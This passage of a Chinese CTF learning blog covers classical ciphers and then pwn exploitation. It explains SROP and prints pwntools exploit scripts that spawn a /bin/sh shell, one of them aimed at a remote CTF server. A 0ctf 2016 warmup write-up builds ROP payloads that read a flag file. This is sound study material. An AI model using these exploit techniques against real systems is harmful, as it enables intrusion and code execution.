<p>加密：<img src="http://static.zybuluo.com/hgggg/ipwe3sgrjdy67i3wrq742axh/123456%20%282%29.png" alt="123456 (2).png-2.8kB"><br>
解密：<img src="http://static.zybuluo.com/hgggg/mrl6gjagmgqzmwfwp9r8rc4t/123456%20%283%29.png" alt="123456 (3).png-3.1kB"><br>
乘法逆元求法：<img src="http://static.zybuluo.com/hgggg/xw1my1dv05jobvaaocdtgzyd/123456%20%284%29.png" alt="123456 (4).png-1.8kB"><br>
<em><strong>关于公式</strong></em></p>
<pre><code>a与m互素，m=26,x为原文，b为偏移量
</code></pre>
<p><em><strong>关于乘法逆元</strong></em></p>
<pre><code>    例如，求5关于模14的乘法逆元：14=5*2+4，5=4*1+1说明5与14互素，存在5关于14的乘法逆元。1=5-4=5-(14-5*2)=5*3-14因此，5关于模14的乘法逆元为3。
</code></pre>
<p><em><strong>破解</strong></em></p>
<pre><code>若a=1,则刚好就是凯撒密码。
若a!=1,我们可以知道m=26，a与m互素，即可得到的取值范围为：1，3，5，7，9，11，13，15，17，19，21，23，25中的一个，所以一共有12*26=312种可能的密钥，此时采用穷举法即可攻击。
若我们已经知道了两个加密后的字母c1,c2。那么通过公式c1 = a(x1+b) mod m ; c2 = a(x2+b) mod m;则c1-c2可得：c1-c2=a(x1-x2) mod m即可求解a，再用穷举法得到b。
</code></pre>
<h2 id="4-多表替换密码"><a class="header-anchor" href="#4-多表替换密码">¶</a>4.多表替换密码</h2>
<h3 id="4-1多表替换原理"><a class="header-anchor" href="#4-1多表替换原理">¶</a>4.1多表替换原理</h3>
<pre><code>由于单表替换密码容易被频率分析破解，人们提出了多表替换加密，即用多个码表来依次对明文消息的字母进行代换。相较于单表替换，多表替换后，密文几乎不再保持原来的频率，所以更加难以破解，我们一般只能通过寻找算法实现对应的弱点进行破解。在多表替换中，以Playfair、Vigenere、Nihilist、Hill等较为出名，这里我们指选择分析其中的几种。
</code></pre>
<h3 id="4-2autokey-维吉尼亚"><a class="header-anchor" href="#4-2autokey-维吉尼亚">¶</a>4.2autokey/维吉尼亚</h3>
<pre><code>维吉尼亚密码，作为最经典的多表密码，其码表如下图：
码表第一排对应明文，第一列对应密钥。例如：
明文为：i like crypto
密钥为：nssctf
密文为：v damx heqhvh
</code></pre>
<p>破解<br>
由于维吉尼亚密码属于多表加密，所以一个字母可能被加密成不同的密文，由于密钥是重复使用的，所以只要知道了密钥的长度，就可以将其看成是交织在一起的凯撒密码，每一个都可以单独破解。密钥长度可以使用卡西斯基试验来得到。</p>
<p><img src="http://static.zybuluo.com/hgggg/er0k0mqmiaxoeo4ktiw98ioc/1587018-20191126194722022-992570273.jpg" alt="1587018-20191126194722022-992570273.jpg-207.2kB"></p>
<pre><code>Autokey与维吉尼亚密码密码类似，自动密钥密码（Autokey）主要有两种，关键词自动密钥密码和原文自动密钥密码。所以它比维吉尼亚更加安全。下面我们以关键词自动密钥为例：
明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG
关键词：CULTURE
自动生成密钥：CULTURE THE QUICK BROWN FOX JUMPS OVER THE
密文：VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK
</code></pre>
<h3 id="4-3希尔密码"><a class="header-anchor" href="#4-3希尔密码">¶</a>4.3希尔密码</h3>
<pre><code>希尔密码（Hill）使用每个字母在字母表中的顺序作为其对应的数字，即A=0，B=1，C=2 等，然后将明文转化为 n 维向量，跟一个 n × n 的矩阵相乘，再将得出的结果模 26。加密矩阵必须是可逆的，否则就不可能解码。只有矩阵的行列式和 26 互质，才是可逆的。
</code></pre>
<p>加密：<br>
<img src="http://static.zybuluo.com/hgggg/geep66492gw4cd9jwo6yamm1/123456%20%285%29.png" alt="123456 (5).png-68.1kB"><br>
解密：<br>
求出加密矩阵的逆矩阵然后同密文相乘后再对等到的矩阵模26(人懒就不上图了)</p>
<h2 id="5-其他密码"><a class="header-anchor" href="#5-其他密码">¶</a>5.其他密码</h2>
<h4 id="培根密码："><a class="header-anchor" href="#培根密码：">¶</a>培根密码：</h4>
<p><img src="http://static.zybuluo.com/hgggg/7alys7nj2040f01lc4mmbzj7/123456.png" alt="123456.png-19.2kB"></p>
<h4 id="栅栏密码："><a class="header-anchor" href="#栅栏密码：">¶</a>栅栏密码：</h4>
<pre><code>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。
</code></pre>
<h4 id="JSFuck"><a class="header-anchor" href="#JSFuck">¶</a>JSFuck:</h4>
<p>形如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br><span class="line">原作者github:https://github.com/aemkei/jsfuck</span><br></pre></td></tr></table></figure>
<h4 id="BrainFuck"><a class="header-anchor" href="#BrainFuck">¶</a>BrainFuck</h4>
<pre><code>一种极小众的计算机语言，由“&gt;、&lt;、+、-、.、,、[、]&quot;八个符号组成。该语言由目前有专门的解释器，感兴趣可以自行了解。
</code></pre>
<h4 id="猪圈及其变形"><a class="header-anchor" href="#猪圈及其变形">¶</a>猪圈及其变形</h4>
<pre><code>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/j5ds8cf7kr3ivkob7dbyhniv/123456.jpg" alt="123456.jpg-26.6kB"></p>
<h4 id="跳舞的小人"><a class="header-anchor" href="#跳舞的小人">¶</a>跳舞的小人</h4>
<pre><code>出自《福尔摩斯》的密码
</code></pre>
<p><img src="http://static.zybuluo.com/hgggg/g6nj57kk1444l2zizplrhla0/123456%20%282%29.jpg" alt="123456 (2).jpg-23.3kB"></p>
<h4 id="来自宇宙的信号"><a class="header-anchor" href="#来自宇宙的信号">¶</a>来自宇宙的信号</h4>
<p><img src="http://static.zybuluo.com/hgggg/9rbnfvwqapog0zs4at0bqzuw/20180310123813709.png" alt="20180310123813709.png-92.4kB"></p>
<h4 id="古精灵码"><a class="header-anchor" href="#古精灵码">¶</a>古精灵码</h4>
<p><img src="http://static.zybuluo.com/hgggg/zrn18wxlgf7gi88475gs61ni/55409313b07eca805f84325b982397dda044835e.jpg" alt="55409313b07eca805f84325b982397dda044835e.jpg-29.3kB"></p>
<pre><code>除了以上列出来的这些，还有盲文、数字盲文、音符加密、01248、与佛论禅等也曾出现在CTF比赛中。
</code></pre>
<h3 id="6-常用网站"><a class="header-anchor" href="#6-常用网站">¶</a>6.常用网站</h3>
<pre><code>http://ctf.ssleye.com/#
https://quipqiup.com/
</code></pre>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>crypto笔记</tag>
        <tag>古典密码</tag>
      </tags>
  </entry>
  <entry>
    <title>SROP</title>
    <url>/2021/11/19/SROP/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/39.jpg" alt="pic"><br><span id="more"></span></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SROP(Sigreturn Oriented Programming)这种利用方法经常会用在bypass一些沙盒保护或者是一些高版本的glibc的利用方式如house of pig ,house of banana 等，是很多利用方式的一个前置技能，故特地来学习下。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>下图是当Linux/Unix操作系统中一个进程从接收到一个信号（signal）到恢复进程执行所经历的一个过程。<br><img src="https://gitee.com/Nss-harukii/images/raw/master/123.png" alt="pic"></p>
<p>Step1: 用户层接收到一个signal  </p>
<p>Step2: 内核层会保存当前进程的上下文即sigFrame（即寄存器的状态）到栈上，然后被内核挂起。此时sigFrame顶部的八/四个字节会被设置为rt_sigreturn,rt_sigreturn处的内容指向sigreturn系统调用代码。</p>
<p>Step3: 用户层的Signal Handle将会对接受到的signal做一个处理，处理结束后会将栈顶指针指向rt_sigreturn。</p>
<p>Step4: sigreturn系统调用最终会根据SigFrame中的数据将上下文恢复</p>
<p>Step5: 继续执行进程</p>
<p><strong>那么我们的攻击思路就很显而易见了，如果我们在sigreturn恢复进程上下文之前就将SigFrame中的数据篡改为我们的恶意代码，就能控制寄存器来劫持程序执行流</strong></p>
<p>Step4中sigreturn恢复上下文的操作其实是根据ucontext_t结构体来恢复，ucontext结构体内容如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags; <span class="comment">// 0-8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span> <span class="comment">// 8-16</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// 16-40 the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// 40-296 the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;     <span class="comment">// 40-48</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;     <span class="comment">// 48-56</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;    <span class="comment">// 56-64</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;    <span class="comment">// 64-72</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;    <span class="comment">// 72-80</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;    <span class="comment">// 80-88</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;    <span class="comment">// 88-96</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;    <span class="comment">// 96-104</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;    <span class="comment">// 104-112</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;    <span class="comment">// 112-120</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;    <span class="comment">// 120-128</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;    <span class="comment">// 128-136</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;    <span class="comment">// 136-144</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;    <span class="comment">// 144-152</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;    <span class="comment">// 152-160</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;    <span class="comment">// 160-168</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;    <span class="comment">// 168-176</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>而SROP其实就是伪造ucontext_t结构体，而在pwntools中已经集成了相关的方法</p>
<p>具体构造方法见：<a href="http://docs.pwntools.com/en/stable/rop/srop.html?highlight=srop">http://docs.pwntools.com/en/stable/rop/srop.html?highlight=srop</a> </p>
<h2 id="Demo-摘自EX师傅的博客"><a href="#Demo-摘自EX师傅的博客" class="headerlink" title="Demo(摘自EX师傅的博客)"></a>Demo(摘自<a href="http://blog.eonew.cn/archives/975">EX师傅的博客</a>)</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// compiled: </span></span><br><span class="line"><span class="comment">// gcc -g -c -fno-stack-protector srop.c -o srop.o</span></span><br><span class="line"><span class="comment">// ld -e main srop.o -o srop</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> global_buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="comment">// 读取最多 200 字节</span></span><br><span class="line">        <span class="string">&quot;mov $0, %%rax\n&quot;</span> <span class="comment">// sys_read</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;mov $0, %%rdi\n&quot;</span> <span class="comment">// fd</span></span><br><span class="line">        <span class="string">&quot;lea %0, %%rsi\n&quot;</span> <span class="comment">// buf</span></span><br><span class="line">        <span class="string">&quot;mov $0x200, %%rdx\n&quot;</span> <span class="comment">// count</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span></span><br><span class="line">        <span class="comment">// 读取字节数小于 ucontext_t结构体则直接 exit</span></span><br><span class="line">        <span class="string">&quot;cmp $0xf8, %%rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;jb exit\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 进行恢复上下文</span></span><br><span class="line">        <span class="string">&quot;mov $0, %%rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%rsi, %%rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $15, %%rax\n&quot;</span> <span class="comment">// sys_rt_sigaction</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span></span><br><span class="line">        <span class="string">&quot;jmp exit\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* split */</span></span><br><span class="line">        <span class="string">&quot;nop\n&quot;</span></span><br><span class="line">        <span class="string">&quot;nop\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// syscall 的 symbol，便于查找</span></span><br><span class="line">        <span class="string">&quot;syscall:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span> </span><br><span class="line">        <span class="string">&quot;jmp exit\n&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 退出程序</span></span><br><span class="line">        <span class="string">&quot;exit:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $60, %%rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $0, %%rsi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span>         </span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;m&quot;</span> (global_buf)</span><br><span class="line">        : </span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成调试文件</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;pid&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">str_bin_sh_offset = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating a custom frame</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = elf.symbols[<span class="string">&#x27;global_buf&#x27;</span>] + str_bin_sh_offset</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">sh.send(<span class="built_in">bytes</span>(frame).ljust(str_bin_sh_offset, <span class="string">b&#x27;a&#x27;</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除调试文件</span></span><br><span class="line">os.system(<span class="string">&quot;rm -f pid&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="列题"><a href="#列题" class="headerlink" title="列题"></a>列题</h2><h3 id="CISCN-2019华南-PWN3"><a href="#CISCN-2019华南-PWN3" class="headerlink" title="[CISCN 2019华南]PWN3"></a>[CISCN 2019华南]PWN3</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>vuln函数中存在明显的栈溢出，且read和write函数都是通过syscall来调用的，同时write会打印出一个栈地址</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/1.png" alt="pic"></p>
<p>同时题目还给到一个gadget<br><img src="https://gitee.com/Nss-harukii/images/raw/master/P9D.png" alt="pic"></p>
<p>这题目的用意就很明显了，“mov rax 0x0f”,而sigreturn的系统调用号就正好是15号，题目中也给出了“syscall ret ”这意味着我们可以直接调用sigreturn，通过伪造SigFrame来控制寄存器，/bin/sh的地址我们可以通过之前打印出来的栈地址减去偏移来计算。</p>
<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;ciscn_s_3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28101</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_s_3&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">syscall_15 = <span class="number">0x0000000004004DA</span></span><br><span class="line">syscall = <span class="number">0x000000000400517</span> </span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(main))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">bin_sh = stack_addr - <span class="number">0x138</span></span><br><span class="line">farme = SigreturnFrame()</span><br><span class="line">farme.rax = <span class="number">59</span></span><br><span class="line">farme.rdi = bin_sh</span><br><span class="line">farme.rip = syscall</span><br><span class="line">farme.rsi = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(syscall_15)+p64(syscall)+<span class="built_in">bytes</span>(farme)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Srop进阶"><a href="#Srop进阶" class="headerlink" title="Srop进阶"></a>Srop进阶</h2><p>在一些堆的利用中，一般会用setcontext+xx的位置来完成SROP来进行orw，在glibc2.27版本及一下一般是setcontext+53，2.3+版本一般为setcontext+61在后续的一些高版本glibc利用方式的中会详细介绍。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=11">https://www.bilibili.com/video/BV1Uv411j7fr?p=11</a><br><a href="https://www.anquanke.com/post/id/85810">https://www.anquanke.com/post/id/85810</a><br><a href="http://blog.eonew.cn/archives/975">http://blog.eonew.cn/archives/975</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>每日一pwn</title>
    <url>/2021/11/21/%E6%AF%8F%E6%97%A5%E4%B8%80pwn/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/44.jpg" alt=""><br><span id="more"></span></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>用来记录一些让我学到新东西的题，wp尽量详细，也是以一个日志的形式来记录学习过程</p>
<h2 id="2021-11-21"><a href="#2021-11-21" class="headerlink" title="2021-11-21"></a>2021-11-21</h2><h3 id="0ctf-2016-warmup"><a href="#0ctf-2016-warmup" class="headerlink" title="0ctf 2016 warmup"></a>0ctf 2016 warmup</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/warmup">附件</a></p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>这题的漏洞点比较明显，就是一个简单的栈溢出<br><img src="https://gitee.com/Nss-harukii/images/raw/master/2.png" alt="pic"></p>
<p>这个题巧妙的地方就在于它的利用方式，这个题利用了alarm函数的性质： <strong>如果在一次程序执行的过程中多次调用alarm函数，那么alarm就会返回前一个alarm从开始到现在还剩下多长时间，并且将这个值赋值给eax寄存器</strong>。</p>
<p>利用这条性质我们就可以控制rax寄存器的值</p>
<p>那么题目的思路就比较显而易见了</p>
<p>由于程序中存在<code>alarm(0xA)</code>,所以我们可以控制rax值为10一下的数，我们还知道32位中open的系统调用号为5，即我们可以控制eax的值为5来调用open函数，再配合程序中给出的read和write，我们就可以实现orw</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/3.png" alt="pic"></p>
<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="Step1-将’-flag’字符串写入到data段上"><a href="#Step1-将’-flag’字符串写入到data段上" class="headerlink" title="Step1 将’./flag’字符串写入到data段上"></a>Step1 将’./flag’字符串写入到data段上</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>       <span class="comment">#padding</span></span><br><span class="line">payload1 += p32(sys_read)</span><br><span class="line">payload1 += p32(vuln)      <span class="comment">#ret_addr 这里原本想返回main函数的，但是不知道为什么填main函数会崩掉</span></span><br><span class="line">payload1 += p32(<span class="number">0</span>)         <span class="comment">#fd 获取键盘输入</span></span><br><span class="line">payload1 += p32(flag_addr) <span class="comment">#buf</span></span><br><span class="line">payload1 += p32(<span class="number">0x10</span>)      <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;./flag\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="Step2-构造open-‘-flag’-0"><a href="#Step2-构造open-‘-flag’-0" class="headerlink" title="Step2 构造open(‘./flag’,0)"></a>Step2 构造open(‘./flag’,0)</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sleep(<span class="number">5</span>)               <span class="comment"># 0xa-5 = 5 </span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload2 += p32(alarm) <span class="comment"># mov rax , 5</span></span><br><span class="line">payload2 += p32(set_ebx_ecx_edx_int80)  <span class="comment"># open</span></span><br><span class="line">payload2 += p32(vuln)       <span class="comment"># ret_addr</span></span><br><span class="line">payload2 += p32(flag_addr)  <span class="comment"># ./flag</span></span><br><span class="line">payload2 += p32(<span class="number">0</span>)          <span class="comment"># O_RDONLY</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="Step3-read-3-flag-0x20"><a href="#Step3-read-3-flag-0x20" class="headerlink" title="Step3 read(3,flag,0x20)"></a>Step3 read(3,flag,0x20)</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload3 += p32(sys_read)</span><br><span class="line">payload3 += p32(vuln)</span><br><span class="line">payload3 += p32(<span class="number">3</span>)               <span class="comment">#fd</span></span><br><span class="line">payload3 += p32(flag_addr+<span class="number">0x10</span>)  <span class="comment">#buf</span></span><br><span class="line">payload3 += p32(<span class="number">0x10</span>)            <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload3)</span><br></pre></td></tr></table></figure>
<h5 id="Step4-write-1-flag-0x20"><a href="#Step4-write-1-flag-0x20" class="headerlink" title="Step4 write(1,flag,0x20)"></a>Step4 write(1,flag,0x20)</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Good Luck!&quot;</span>)</span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload4 += p32(sys_write)</span><br><span class="line">payload4 += p32(<span class="number">0</span>)              <span class="comment">#ret_addr</span></span><br><span class="line">payload4 += p32(<span class="number">1</span>)              <span class="comment">#fd</span></span><br><span class="line">payload4 += p32(flag_addr+<span class="number">0x10</span>) <span class="comment">#buf</span></span><br><span class="line">payload4 += p32(<span class="number">0x10</span>)           <span class="comment">#nbytes</span></span><br><span class="line">p.send(payload4)</span><br></pre></td></tr></table></figure>
